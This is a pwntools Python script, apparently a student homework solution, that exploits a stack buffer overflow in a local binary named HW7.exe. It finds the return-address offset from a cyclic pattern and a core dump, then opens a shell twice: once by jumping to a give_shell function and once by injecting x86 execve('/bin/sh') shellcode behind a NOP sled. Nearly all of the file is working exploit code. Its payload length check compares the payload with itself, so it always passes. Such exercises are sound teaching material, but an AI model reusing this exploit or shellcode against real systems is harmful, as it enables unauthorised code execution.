#Alexander Antoun

# Results from checksec command:
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE
# RWX:      Has RWX segments
from pwn import*
def start (argv=[], *a, **kw):
    '''Start the exploit against rmthe target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def giveShell():
    io = start()
    # Address of shell is 08049269
    targetAddr = exe.symbols['_Z10give_shellv']
    targetAddr2 = hex(targetAddr)
    print("address is:",targetAddr2)  # Address of the shell is 08049269, used nm to find name of
                        # function
    io = start()
    io.sendline(cyclic(400, n=4))   #send cyclic pattern
    io.wait()   #wait for coredump
    core = io.corefile
    payloadLength = cyclic_find(core.read(core.esp, 4), n=4)
    print(f'Size of Payload is: {payloadLength}')   #316, 312 bytes of junk, 4 bytes for address 
    io.close()
    #Building String
    payload = b"A"*312
    targetAddr = p32(targetAddr)
    payload+=targetAddr
    io = start()
    io.sendline(payload)
    io.interactive()


def remoteShell():
    #Crashing program and analyzing the core dump
    print("Crashing the program...")
    io = start()
    io.sendline(cyclic(400, n=4))   #send cyclic pattern
    io.wait()   #wait for coredump
    core = io.corefile
    payloadLength = cyclic_find(core.read(core.esp, 4), n=4)
    print(f'Size of Payload is: {payloadLength}')
    io.close()

    #Shellcode generated by GDB-peda
    myShell = (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )

    #Below is to find the base address of the buffer
    io = start()
    address = core.esp-payloadLength    #Find base address
    repeatReturn = p32(address)*5

    sledLength = payloadLength - len(repeatReturn) - len(myShell)
    #debugging
    print("Length of repeated return address is:",len(repeatReturn)) # =20
    print("Shellcode length is:",len(myShell))  # =24
    print(f'Length of the shellcode and sled is: {len(myShell) + sledLength}')  # =296 And 296 is 
                                                                                #divisble by 4 so this is okay
    # 296 + 20 = 316 which is the length of our shellcode, so everything is okay here

    NOPSled = b'\x90'*sledLength
    payload = NOPSled + myShell + repeatReturn

    if len(payload) != len(payload):
        print("Error: Payload length incorrect")
    else:
        print(f'Payload length is: {len(payload)}')
        io.sendline(payload)
        io.interactive()
        print("Goodbye!")

target_program = './HW7.exe'
exe = context.binary = ELF(target_program)  #gives the security and architecture information

giveShell()
remoteShell()
